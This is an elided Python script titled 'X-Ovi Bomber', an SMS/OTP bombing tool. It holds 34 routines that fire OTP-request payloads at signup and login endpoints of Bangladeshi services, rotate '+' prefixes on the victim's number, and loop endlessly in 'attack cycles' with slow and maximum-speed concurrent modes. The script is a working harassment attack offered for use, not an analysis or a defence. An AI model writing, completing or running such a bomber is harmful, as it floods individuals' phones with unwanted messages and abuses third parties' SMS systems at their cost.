...
# -*- coding: utf-8 -*-
"""
X-Ovi Bomber - Simple 3 API Edition (Slow & Controlled)
...
def _sig_handler_1(signum, frame):
    ...
    print(f"{_c['p']}🔥 Created by: X-Ovi Bomber{_c['e']}")
    sys.exit(0)
...
def _print_banner():
    ...
    banner_lines = [
        ...
        "  B  O  M  B  E  R     V 1",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"{_c['r']}{_c['B']}💀 X-OVI BOMBER - ALL 34+ APIs EDITION 💀{_c['c']}",
        ...
        f"{_c['p']}Created by: {_c['w']}X-Ovi Bomber{_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]
...
class _ServiceManager:
    def __init__(self, phone_data):
        ...
        self.fast_mode = False  # Flag for fast mode (single request, no delay)
    ...
    async def _s1(self, session):
        # BTCL MyBTCL - 5 slow sequential requests with + format (or 1 in fast mode)
        ...
        print(f"{_c['y']}🔄 Starting BTCL MyBTCL - {1 if self.fast_mode else 5} requests...{_c['e']}")
        
        loop_count = 1 if self.fast_mode else 5
        for i in range(loop_count):
            prefix = "+" * (i + 1) if not self.fast_mode else "+"  # in fast mode, just "+"
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            
            print(f"{_c['c']}[{i+1}/{loop_count}] Sending to {phone}...{_c['e']}")
    ...
    async def _s2(self, session):
        # BTCL PhoneBill - 5 slow sequential requests with + format (or 1 in fast mode)
        ...
        print(f"{_c['y']}🔄 Starting BTCL PhoneBill - {1 if self.fast_mode else 5} requests...{_c['e']}")
        
        loop_count = 1 if self.fast_mode else 5
        for i in range(loop_count):
            prefix = "+" * (i + 1) if not self.fast_mode else "+"
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
    ...
    async def _s3(self, session):
        # Bioscope Plus - 5 slow sequential requests with + format (or 1 in fast mode)
        ...
        print(f"{_c['y']}🔄 Starting Bioscope Plus - {1 if self.fast_mode else 5} requests...{_c['e']}")
        
        loop_count = 1 if self.fast_mode else 5
        for i in range(loop_count):
            prefix = "+" * (i + 1) if not self.fast_mode else "+"
            phone = f"{prefix}88{self.phone_data['cleaned']}"  # +88, ++88, etc.
    ...
    async def _s4(self, session):
        ...
        print(f"{_c['y']}🔄 Starting BTCL BDIA - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s5(self, session):
        ...
        print(f"{_c['y']}🔄 Starting BD Tickets - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s6(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Apex4U - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s7(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Swap.com.bd - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s8(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Ilyn Global - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s9(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Arogga - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s10(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Fundesh - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s11(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Garibook - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s12(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Sheba - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s13(self, session):
        ...
        print(f"{_c['y']}🔄 Starting AppLink - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s14(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Bikroy - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s15(self, session):
        ...
        print(f"{_c['y']}🔄 Starting MyGP Cinematic - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s16(self, session):
        ...
        print(f"{_c['y']}🔄 Starting GP Web Login - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s17(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Ghoori Learning - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s18(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Deepto Play - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s19(self, session):
        ...
        print(f"{_c['y']}🔄 Starting ePharma - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s20(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Sailor Clothing - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s21(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Isho - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s22(self, session):
        ...
        print(f"{_c['y']}🔄 Starting MedEasy - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s23(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Osudpotro - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s24(self, session):
        ...
        print(f"{_c['y']}🔄 Starting TheClinicall - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s25(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Shombhob - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s26(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Care Box - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s27(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Renix Care - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s28(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Jayabaji Check Username - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s29(self, session):
        ...
        print(f"{_c['y']}🔄 Starting PKLuck2 Register - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s30(self, session):
        ...
        print(f"{_c['y']}🔄 Starting PKLuck2 No Login - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s31(self, session):
        ...
        print(f"{_c['y']}🔄 Starting GP Flexiplan - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s32(self, session):
        ...
        print(f"{_c['y']}🔄 Starting GP FWA - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s33(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Mevrik - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _s34(self, session):
        ...
        print(f"{_c['y']}🔄 Starting Priyoshikkhaloy - {1 if self.fast_mode else 5} requests...{_c['e']}")
    ...
    async def _run_all_services_fast(self):
        ...
        print(f"{_c['y']}⚡ ALL 34+ APIs - MAXIMUM SPEED CONCURRENT (1 REQUEST EACH)!{_c['e']}")
        ...
        async with aiohttp.ClientSession(
            ...
            print(f"{_c['g']}[TOTAL SENT] {len(results)} SMS requests sent (34+ APIs × {_fast_cfg[3]} waves × fast mode){_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests successful{_c['e']}")
            
            # Reset fast mode flag
...
async def _main():
    ...
    print(f"{_c['g']}[1] SLOW MODE - All 34+ APIs (5 requests each, controlled){_c['e']}")
    print(f"{_c['r']}[2] FAST MODE - All 34+ APIs (1 request each, maximum speed){_c['e']}")
    ...
    try:
        while True:
            ...
            # Run all services according to mode
            ...
            # Cooldown with animation (only in slow mode)
            if _current_mode == 'slow':
                print(f"{_c['c']}[COOLDOWN] Next attack cycle in:{_c['e']}")
                for i in range(_cfg[1], 0, -1):  # LOOP_DELAY = 2
                ...
                # In fast mode, no cooldown, just continue immediately
